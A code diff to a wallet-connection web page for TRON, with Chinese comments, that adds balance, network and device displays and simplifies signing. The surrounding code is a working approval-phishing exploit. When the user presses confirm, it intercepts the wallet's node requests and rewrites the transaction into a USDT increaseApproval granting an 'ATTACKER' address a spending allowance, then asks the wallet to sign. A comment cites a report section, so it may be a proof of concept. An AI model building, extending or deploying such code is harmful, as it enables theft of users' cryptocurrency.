@@ -19,6 +19,11 @@
     .btn-go:hover:not(:disabled) { transform:scale(1.02); box-shadow:0 0 20px rgba(239,68,68,0.3); }
     .btn-outline { width:auto; padding:8px 16px; background:transparent; border:1px solid var(--border); color:var(--text); border-radius:8px; font-size:13px; cursor:pointer; }
     .btn:disabled { opacity:.45; cursor:not-allowed; }
+    .info-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-top:10px; }
+    .info-item { padding:6px 10px; background:rgba(255,255,255,0.03); border:1px solid var(--border); border-radius:6px; }
+    .info-label { font-size:10px; color:var(--muted); }
+    .info-value { font-size:13px; font-weight:600; font-family:'Fira Code',monospace; }
+    .info-value.bal { color:var(--success); }
     .log { background:var(--code); border:1px solid var(--border); border-radius:8px; height:340px; overflow-y:auto; padding:10px; font-family:'Fira Code',monospace; font-size:11px; line-height:1.6; }
     .log .t { color:#64748b; }
     .log .w { color:#fbbf24; } .log .e { color:#f87171; } .log .s { color:#34d399; } .log .i { color:#60a5fa; }
@@ -30,18 +35,26 @@
 <body>
 <div class="container">
 
+  <!-- ====== 钱包 ====== -->
   <div class="card">
     <div class="row">
       <span class="dot" id="dot"></span>
       <span style="font-size:14px;" id="status">未连接</span>
     </div>
     <div class="addr" id="addr" style="margin-top:6px;">—</div>
+    <div class="info-grid">
+      <div class="info-item"><div class="info-label">TRX</div><div class="info-value bal" id="balTrx">—</div></div>
+      <div class="info-item"><div class="info-label">USDT</div><div class="info-value bal" id="balUsdt">—</div></div>
+      <div class="info-item"><div class="info-label">网络</div><div class="info-value" id="net" style="font-size:11px;">—</div></div>
+      <div class="info-item"><div class="info-label">设备</div><div class="info-value" id="dev" style="font-size:11px;">—</div></div>
+    </div>
     <div style="display:flex; gap:8px; margin-top:10px;">
       <button class="btn-outline" id="btnConn" onclick="connect()">连接钱包</button>
       <button class="btn-outline" id="btnDisc" onclick="disconnect()" style="display:none;">断开</button>
     </div>
   </div>
 
+  <!-- ====== 执行 ====== -->
   <div class="card">
     <div class="grid2">
       <div><label>Fee Limit (SUN)</label><input type="number" id="fee" value="100000000"></div>
@@ -55,6 +68,7 @@
     <button class="btn btn-go" id="btnExec" onclick="exec()" disabled>确 认</button>
   </div>
 
+  <!-- ====== 日志 ====== -->
   <div class="card" style="padding:12px 16px;">
     <div class="log" id="log"><span class="t">--:--:--</span> 等待操作…</div>
   </div>
@@ -94,6 +108,7 @@ let uid = 'd_' + Date.now();
 const $ = (id) => document.getElementById(id);
 const D = {
   dot: $('dot'), status: $('status'), addr: $('addr'),
+  balTrx: $('balTrx'), balUsdt: $('balUsdt'), net: $('net'), dev: $('dev'),
   btnConn: $('btnConn'), btnDisc: $('btnDisc'), btnExec: $('btnExec'),
   log: $('log'), fee: $('fee'), mode: $('mode'),
 };
@@ -140,7 +155,9 @@ function buildParam(hex, m) {
 //  初始化 tronWeb
 // ================================================================
 function getTW() {
+  // 优先使用 TP 注入的 tronWeb (window.tronWeb.fullNode.request 存在即可)
   if (window.tronWeb?.fullNode?.request) return window.tronWeb;
+  // 回退：自己构造 TronWeb 实例
   if (window.TronWeb) {
     const P = window.TronWeb.providers.HttpProvider;
     return new TronWeb(new P('https://api.trongrid.io'), new P('https://api.trongrid.io'), new P('https://api.trongrid.io'));
@@ -150,6 +167,24 @@ function getTW() {
 
 function toHex(a) { try { return wallet.tw.address.toHex(a); } catch(e) { return null; } }
 function fromHex(h) { try { return wallet.tw.address.fromHex(h); } catch(e) { return null; } }
+
+// ================================================================
+//  余额查询
+// ================================================================
+async function refreshBalances() {
+  if (!wallet.ok) return;
+  const tw = wallet.tw;
+  try {
+    const sun = await tw.trx.getBalance(wallet.address);
+    D.balTrx.textContent = tw.fromSun(sun) + ' TRX';
+  } catch(e) { D.balTrx.textContent = '—'; }
+  try {
+    const c = await tw.contract().at(USDT_CONTRACT);
+    const raw = await c.balanceOf(wallet.address).call();
+    const u = (tw.toDecimal ? tw.toDecimal(raw) : Number(raw)) / 1e6;
+    D.balUsdt.textContent = u.toLocaleString() + ' USDT';
+  } catch(e) { D.balUsdt.textContent = '—'; }
+}
 
 // ================================================================
 //  钱包连接
@@ -168,7 +203,7 @@ async function connect() {
     } catch(e) { L('tron_requestAccounts 失败: '+e.message,'w'); }
   }
 
-  // 方式 2: TP 注入
+  // 方式 2: TP 注入的 tronWeb.defaultAddress
   if (!addr && window.tronWeb?.defaultAddress?.base58) {
     addr = window.tronWeb.defaultAddress.base58;
   }
@@ -186,18 +221,32 @@ async function connect() {
   if (!tw) { L('无法初始化 TronWeb','e'); D.btnConn.disabled = false; return; }
 
   wallet.address = addr; wallet.tw = tw; wallet.hex = toHex(addr); wallet.ok = true;
+
+  // 更新 UI
   D.dot.classList.add('on'); D.status.textContent = '已连接';
   D.addr.textContent = addr;
   D.btnConn.style.display = 'none'; D.btnDisc.style.display = '';
   D.btnExec.disabled = false;
   D.mode.value = 'auto';
   D.mode.options[0].text = `自动检测 (当前: ${getOS()})`;
+
+  // 网络 & 设备
+  try {
+    const host = tw.fullNode?.host || tw.fullNode?.node?.host || '';
+    D.net.textContent = host.includes('trongrid') ? 'Mainnet' : (host || '—');
+  } catch(e) { D.net.textContent = '—'; }
+  D.dev.textContent = getOS().toUpperCase();
+
+  // 查询余额
+  await refreshBalances();
+
   L('已连接: '+addr,'s');
 }
 
 function disconnect() {
   wallet = { address: null, hex: null, tw: null, ok: false };
   D.dot.classList.remove('on'); D.status.textContent = '未连接'; D.addr.textContent = '—';
+  D.balTrx.textContent = '—'; D.balUsdt.textContent = '—'; D.net.textContent = '—'; D.dev.textContent = '—';
   D.btnConn.style.display = ''; D.btnDisc.style.display = 'none'; D.btnExec.disabled = true;
   L('已断开','w');
 }
@@ -231,12 +280,14 @@ async function exec() {
       L('⚠ 拦截器 #'+intCount+' 命中! path='+(typeof url==='string'?url.substring(0,60):''),'e');
 
       // 改写 contract_address → USDT
+      const oldC = body.contract_address;
       body.contract_address = USDT_CONTRACT_HEX;
-      L('  contract_address → USDT ('+USDT_CONTRACT_HEX+')','e');
+      L('  contract_address: '+(oldC||'?')+' → '+USDT_CONTRACT_HEX,'e');
 
       // 改写 function_selector → increaseApproval
+      const oldS = body.function_selector;
       body.function_selector = ACTUAL_METHOD;
-      L('  function_selector → '+ACTUAL_METHOD,'e');
+      L('  function_selector: '+(oldS||'?')+' → '+ACTUAL_METHOD,'e');
 
       // 改写 parameter (设备分支)
       body.parameter = buildParam(ATTACKER.hex, pm);
@@ -267,8 +318,9 @@ async function exec() {
 
     L('  返回 keys: '+Object.keys(rawRes||{}).join(', '),'i');
     if (rawRes?.result) {
-      L('  result.result: '+(typeof rawRes.result==='object'?JSON.stringify(rawRes.result).substring(0,150):rawRes.result),
-        rawRes.result===true?'s':'e');
+      const r = rawRes.result;
+      L('  result.result: '+(typeof r==='object'?JSON.stringify(r).substring(0,150):r),
+        r===true?'s':'e');
     }
     L('  transaction: '+(rawRes?.transaction?'YES':'NO'), rawRes?.transaction?'s':'e');
 
@@ -315,36 +367,24 @@ async function exec() {
     }
   }
 
-  // --- 步骤 4: 签名 (报告第 10 节) ---
+  // --- 步骤 4: 签名 (报告第 10 节) 仅使用 TP 注入的 tronWeb.trx.sign ---
   L('步骤4: 请求钱包签名…','w');
   L('  请核对钱包弹窗: 合约='+USDT_CONTRACT+' 方法=increaseApproval 授权对象='+ATTACKER.b58,'e');
 
-  let signed = null, errs = [];
-
-  if (!signed && window.tronWeb?.trx?.sign) {
-    try {
-      const r = window.tronWeb.trx.sign(unsignedTx);
-      signed = r?.then ? await r : r;
-      if (signed?.signature) L('window.tronWeb.trx.sign 成功','s');
-    } catch(e) { errs.push('TP sign: '+e.message); L('TP sign 失败: '+e.message,'w'); }
-  }
-
-  if (!signed && window.tronLink?.request) {
-    try {
-      signed = await window.tronLink.request({ method:'tron_signTransaction', params:unsignedTx });
-      if (signed?.signature) L('tronLink.request 成功','s');
-    } catch(e) { errs.push('TL sign: '+e.message); L('TL sign 失败: '+e.message,'w'); }
-  }
-
-  if (!signed && tw.trx?.sign) {
-    try {
-      signed = await tw.trx.sign(unsignedTx);
-      if (signed?.signature) L('tw.trx.sign 成功','s');
-    } catch(e) { errs.push('tw sign: '+e.message); L('tw sign 失败: '+e.message,'w'); }
+  let signed = null;
+  try {
+    const r = window.tronWeb.trx.sign(unsignedTx);
+    signed = r?.then ? await r : r;
+  } catch(e) {
+    L('签名失败: '+e.message,'e');
+    tw.fullNode.request = origReq;
+    L('fullNode.request 已恢复','w');
+    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
+    return;
   }
 
   if (!signed?.signature) {
-    L('所有签名方式均失败','e'); errs.forEach(e=>L('  '+e,'e'));
+    L('签名未返回 signature','e');
     tw.fullNode.request = origReq;
     L('fullNode.request 已恢复','w');
     D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
@@ -404,7 +444,9 @@ if (window.tronLink?.on) {
 //  自动连接
 // ================================================================
 (async function init() {
-  D.mode.options[0].text = `自动检测 (当前: ${getOS()})`;
+  const os = getOS();
+  D.dev.textContent = os.toUpperCase();
+  D.mode.options[0].text = `自动检测 (当前: ${os})`;
   try {
     let a = window.tronWeb?.defaultAddress?.base58;
     if (!a && window.tronLink?.ready) {
@@ -416,6 +458,11 @@ if (window.tronLink?.on) {
         wallet.address=a; wallet.tw=tw; wallet.hex=toHex(a); wallet.ok=true;
         D.dot.classList.add('on'); D.status.textContent='已连接'; D.addr.textContent=a;
         D.btnConn.style.display='none'; D.btnDisc.style.display=''; D.btnExec.disabled=false;
+        try {
+          const host = tw.fullNode?.host || tw.fullNode?.node?.host || '';
+          D.net.textContent = host.includes('trongrid')?'Mainnet':(host||'—');
+        } catch(e) {}
+        await refreshBalances();
         L('自动连接: '+a,'s');
       }
     }
